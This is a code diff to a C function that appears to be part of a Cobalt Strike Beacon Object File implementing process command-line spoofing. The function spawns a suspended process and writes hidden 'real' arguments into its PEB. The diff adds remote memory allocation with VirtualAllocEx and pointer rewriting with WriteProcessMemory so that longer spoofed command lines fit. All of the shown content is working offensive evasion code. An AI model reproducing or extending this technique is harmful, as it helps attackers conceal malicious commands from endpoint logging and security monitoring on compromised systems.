@@ -242,18 +242,39 @@ BOOL SpawnSuspendedProcess(IN LPCSTR szProcessPath, IN OPTIONAL LPCSTR szArgumen
         goto CLEANUP;
     }
 
-    // Write real command line to process memory
+    USHORT realSizeBytes = (USHORT)(wideRealCmdLineLen * sizeof(WCHAR));
+    PVOID pTargetBuf = parameters.CommandLine.Buffer;
+
+    if (realSizeBytes > parameters.CommandLine.MaximumLength) {
+        pTargetBuf = KERNEL32$VirtualAllocEx(pProcInfo->hProcess, NULL, realSizeBytes,
+            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (!pTargetBuf) {
+            BeaconPrintf(CALLBACK_ERROR, "VirtualAllocEx for cmdline: %lu", KERNEL32$GetLastError());
+            KERNEL32$LocalFree(wideRealCommandLine);
+            goto CLEANUP;
+        }
+
+        SIZE_T bw = 0;
+        KERNEL32$WriteProcessMemory(pProcInfo->hProcess,
+            (PBYTE)peb.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Buffer),
+            &pTargetBuf, sizeof(PVOID), &bw);
+
+        USHORT newMax = realSizeBytes;
+        KERNEL32$WriteProcessMemory(pProcInfo->hProcess,
+            (PBYTE)peb.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.MaximumLength),
+            &newMax, sizeof(USHORT), &bw);
+    }
+
     SIZE_T bytesWritten = 0;
-    if (!KERNEL32$WriteProcessMemory(pProcInfo->hProcess, parameters.CommandLine.Buffer, wideRealCommandLine, 
-        wideRealCmdLineLen * sizeof(WCHAR), &bytesWritten)) {
+    if (!KERNEL32$WriteProcessMemory(pProcInfo->hProcess, pTargetBuf, wideRealCommandLine,
+        realSizeBytes, &bytesWritten)) {
         BeaconPrintf(CALLBACK_ERROR, "WriteProcessMemory (CommandLine) failed: %lu", KERNEL32$GetLastError());
         KERNEL32$LocalFree(wideRealCommandLine);
         goto CLEANUP;
     }
 
-    // Update command line length
     USHORT newLength = (USHORT)((wideRealCmdLineLen - 1) * sizeof(WCHAR));
-    if (!KERNEL32$WriteProcessMemory(pProcInfo->hProcess, 
+    if (!KERNEL32$WriteProcessMemory(pProcInfo->hProcess,
         (PBYTE)peb.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length),
         &newLength, sizeof(USHORT), &bytesWritten)) {
         BeaconPrintf(CALLBACK_ERROR, "WriteProcessMemory (CommandLine.Length) failed: %lu", KERNEL32$GetLastError());
